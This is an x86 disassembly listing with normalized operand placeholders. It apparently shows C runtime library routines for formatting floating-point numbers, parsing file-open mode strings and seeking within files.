cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10037b85
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10037ba1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1003acc5
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_1003ac1d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_10037bfd
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10027160
inc eax
push eax
push esi
add esi edi
push esi
call sub_1002e960
add esp 0x10
sub_10037c42
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1002a8c8
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_1002d4db
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_1002d4db
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10037bfd
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
push r--data
push ebx
push esi
call sub_1002e87c
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1002e960
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_10037db1
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1003aee9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10037c42
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_1003ad6d
add esp 0x10
cmp eax ebx
je r-xdata
sub_10037e81
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037db1
add esp 0x18
pop ebp
retn
sub_10037ea1
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1002a8c8
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1002d4db
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1002d4db
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_10027801
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10037e81
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_1003abf0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1003b060
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1003b060
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10027650
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_1003b060
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1003af80
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1003af80
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1003af80
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_10038214
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1002a8c8
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_10037bfd
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_10037bfd
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_10037bfd
push edi
push 0x30
push esi
call sub_10027650
add esp 0xc
sub_1003830b
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1003aee9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_10038214
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1003ad6d
add esp 0x10
cmp eax ebx
je r-xdata
sub_100383c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1003aee9
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_10027801
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1003ad6d
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10037c42
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10038214
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_100384c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037db1
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003830b
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037ea1
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100383c6
jmp r-xdata
sub_10038548
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100384c0
add esp 0x1c
pop ebp
retn
sub_1003856b
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1003b07f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_100276d9
add esp 0x14
sub_100385d4
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
push 0x0
call eax
retn
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_10038600
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_1003bb73
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1003b0eb
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_100386a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_1002d4db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_1003ca57
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_1003cc07
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_1003cb61
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_1003cb61
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_1003cb61
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_10038967
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_100389d2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10039ff1
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1002d501
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10038a57
push 0x14
push r--data
call sub_1002fdfc
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002d4ee
and [ eax ] 0x0
call sub_1002d4db
mov [ eax ] 0x9
call sub_1002d4ee
mov [ eax ] edi
call sub_1002d4db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002fe41
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
